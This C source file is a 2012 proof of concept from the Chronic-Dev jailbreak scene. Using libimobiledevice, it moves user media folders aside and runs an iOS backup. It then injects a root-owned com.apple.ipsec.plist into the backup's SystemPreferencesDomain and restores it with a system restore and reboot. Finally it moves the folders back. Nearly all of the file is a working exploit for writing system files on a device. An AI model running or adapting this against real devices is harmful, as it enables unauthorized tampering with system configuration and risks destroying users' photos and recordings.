/**
 * POC: injecting a config file via mobilebackup2
 *  without the need of making a complete backup
 *
 * Copyright (C) 2012 Chronic-Dev Team
 * Copyright (C) 2012 Nikias Bassen
 *
 * Chronic-Dev POC license :P
**/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>

#include "idevicebackup2.h"
#include "backup.h"

/* mkdir helper */
int __mkdir(const char* path, int mode) /*{{{*/
{
#ifdef WIN32
	return mkdir(path);
#else
	return mkdir(path, mode);
#endif
} /*}}}*/

/* recursively remove path, including path */
static void rmdir_recursive(const char *path) /*{{{*/
{
	if (!path) {
		return;
	}
	DIR* cur_dir = opendir(path);
	if (cur_dir) {
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0) || (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}
			char *fpath = (char*)malloc(strlen(path)+1+strlen(ep->d_name)+1);
			if (fpath) {
				struct stat st;
				strcpy(fpath, path);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					rmdir_recursive(fpath);
				} else {
					if (remove(fpath) != 0) {
						fprintf(stderr, "could not remove file %s: %s\n", fpath, strerror(errno));
					}
				}
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	if (rmdir(path) != 0) {
		fprintf(stderr, "could not remove directory %s: %s\n", path, strerror(errno));
	}
} /*}}}*/

/* char** freeing helper function */
static void free_dictionary(char **dictionary) /*{{{*/
{
	int i = 0;

	if (!dictionary)
		return;

	for (i = 0; dictionary[i]; i++) {
		free(dictionary[i]);
	}
	free(dictionary);
} /*}}}*/

/* recursively remove path via afc, (incl = 1 including path, incl = 0, NOT including path) */
static int rmdir_recursive_afc(afc_client_t afc, const char *path, int incl) /*{{{*/
{
	char **dirlist = NULL;
	if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
		//fprintf(stderr, "AFC: could not get directory list for %s\n", path);
		return -1;
	}
	if (dirlist == NULL) {
		if (incl) {
			afc_remove_path(afc, path);
		}
		return 0;
	}

	char **ptr;
	for (ptr = dirlist; *ptr; ptr++) {
		if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
			continue;
		}
		char **info = NULL;
		char *fpath = (char*)malloc(strlen(path)+1+strlen(*ptr)+1);
		strcpy(fpath, path);
		strcat(fpath, "/");
		strcat(fpath, *ptr);
		if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
			// failed. try to delete nevertheless.
			afc_remove_path(afc, fpath);
			free(fpath);
			free_dictionary(info);
			continue;
		}

		int is_dir = 0;
		int i;
		for (i = 0; info[i]; i+=2) {
			if (!strcmp(info[i], "st_ifmt")) {
				if (!strcmp(info[i+1], "S_IFDIR")) {
					is_dir = 1;
				}
				break;
			}
		}
		free_dictionary(info);

		if (is_dir) {
			rmdir_recursive_afc(afc, fpath, 0);
		}
		afc_remove_path(afc, fpath);
		free(fpath);
	}

	free_dictionary(dirlist);
	if (incl) {
		afc_remove_path(afc, path);
	}

	return 0;
} /*}}}*/

int connected = 0;

static void idevice_event_cb(const idevice_event_t *event, void *user_data)
{
	char* uuid = (char*)user_data;
	printf("device event %d: %s\n", event->event, event->uuid);
	if (strcmp(uuid, event->uuid)) return;
	if (event->event == IDEVICE_DEVICE_ADD) {
		connected = 1;
	} else if (event->event == IDEVICE_DEVICE_REMOVE) {
		connected = 0;
	}
}

#define BKPTMP "nirvana"
#define AFCTMP "HackStore"

int main(int argc, char** argv)
{
	idevice_t device = NULL;
	lockdownd_client_t lckd = NULL;
	afc_client_t afc = NULL;
	uint16_t port = 0;
	char* uuid = NULL;

	if (IDEVICE_E_SUCCESS != idevice_new(&device, NULL)) {
		printf("No device found, is it plugged in?\n");
		return -1;
	}

	if (IDEVICE_E_SUCCESS == idevice_get_uuid(device, &uuid)) {
		printf("DeviceUniqueID : %s\n", uuid);
	}

	idevice_event_subscribe(idevice_event_cb, uuid);

	if (LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &lckd, "mb2hackup")) {
		idevice_free(device);
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	lockdownd_start_service(lckd, "com.apple.afc", &port);
	if (!port) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Error starting AFC service\n");
		return -1;
	}

	afc_client_new(device, port, &afc);
	if (!afc) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Could not connect to AFC\n");
		return -1;
	}
	lockdownd_client_free(lckd);
	lckd = NULL;

	// check if directory exists
	char** list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		// we're good, directory does not exist.
	} else {
		free_dictionary(list);
		fprintf(stderr, "ERROR: the directory '%s' already exists. This is most likely a failed attempt to use this code...\n", AFCTMP);
		return -1;
	}

	afc_make_directory(afc, "/"AFCTMP);

	printf("moving files aside...\n");
	afc_rename_path(afc, "/Books", "/"AFCTMP"/Books");
	afc_rename_path(afc, "/DCIM", "/"AFCTMP"/DCIM");
	afc_rename_path(afc, "/PhotoData", "/"AFCTMP"/PhotoData");
	afc_rename_path(afc, "/Photos", "/"AFCTMP"/Photos");
	afc_rename_path(afc, "/Recordings", "/"AFCTMP"/Recordings");
	// TODO other paths?

	afc_client_free(afc);
	afc = NULL;
	idevice_free(device);
	device = NULL;

	rmdir_recursive(BKPTMP);
	__mkdir(BKPTMP, 0755);

	char *bargv[] = {
		"idevicebackup2",
		"backup",
		BKPTMP,
		NULL
	};
	int bargc = 3;

	idevicebackup2(bargc, bargv);

	// mess up the backup :D
	char ipsec_plist[] =
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
		"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
		"<plist version=\"1.0\">\n"
		"<dict>\n"
		"  <key>Global</key>\n"
		"  <dict>\n"
		"    <key>DebugLevel</key>\n"
		"    <integer>2</integer>\n"
		"    <key>DebugLogfile</key>\n"
		"    <string>/var/root/racoon.log</string>\n"
		"  </dict>\n"
		"</dict>\n"
		"</plist>\n";

	backup_t* backup = backup_open(BKPTMP, uuid);
	if (!backup) {
		fprintf(stderr, "ERROR: failed to open backup\n");
		return -1;
	}

	backup_file_t* bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.plist");
	if (bf) {
		fprintf(stderr, "com.apple.ipsec.plist already present, replacing\n");
		backup_file_assign_file_data(bf, ipsec_plist, strlen(ipsec_plist), 0);
		backup_file_set_length(bf, strlen(ipsec_plist));
		backup_file_update_hash(bf);

		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		} else {
			backup_write_mbdb(backup);
		}
	} else {
		fprintf(stderr, "adding com.apple.ipsec.plist\n");
		bf = backup_file_create_with_data(ipsec_plist, strlen(ipsec_plist), 0);
		backup_file_set_domain(bf, "SystemPreferencesDomain");
		backup_file_set_path(bf, "SystemConfiguration/com.apple.ipsec.plist");
		backup_file_set_mode(bf, 0100644);
		backup_file_set_inode(bf, 123456);
		backup_file_set_uid(bf, 0);
		backup_file_set_gid(bf, 0);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, strlen(ipsec_plist));
		backup_file_set_flag(bf, 4);
		backup_file_update_hash(bf);

		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		} else {
			backup_write_mbdb(backup);
		}
	}
	backup_file_free(bf);
	backup_free(backup);

	char* rargv[] = {
		"idevicebackup2",
		"restore",
		"--system",
		"--settings",
		"--reboot",
		BKPTMP,
		NULL
	};
	int rargc = 6;

	idevicebackup2(rargc, rargv);

	printf("waiting for device reboot\n");

	// wait for disconnect
	while (connected) {
		sleep(2);
	}

	printf("Device %s disconnected\n", uuid);

	// wait for device to connect
	while (!connected) {
		sleep(2);
	}
	idevice_event_unsubscribe();
	printf("Device %s detected. Connecting...\n", uuid);

	device = NULL;
	if (IDEVICE_E_SUCCESS != idevice_new(&device, uuid)) {
		printf("Reconnect to %s failed... whoops\n", uuid);
		return -1;
	}

	if (LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &lckd, "mb2hackup")) {
		idevice_free(device);
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	port = 0;
	lockdownd_start_service(lckd, "com.apple.afc", &port);
	if (!port) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Error starting AFC service\n");
		return -1;
	}

	afc_client_new(device, port, &afc);
	if (!afc) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Could not connect to AFC\n");
		return -1;
	}
	lockdownd_client_free(lckd);
	lckd = NULL;

	printf("moving back files...\n");

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		fprintf(stderr, "Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
		goto leave;
	}

	int i = 0;
	while (list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}
		printf("%s\n", list[i]);

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		rmdir_recursive_afc(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		printf("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	free_dictionary(list);

	printf("cleaning up\n");
	afc_remove_path(afc, "/"AFCTMP);
	rmdir_recursive(BKPTMP);

	printf("done!\n");

leave:
	afc_client_free(afc);
	afc = NULL;
	idevice_free(device);
	device = NULL;
	free(uuid);

	return 0;
}
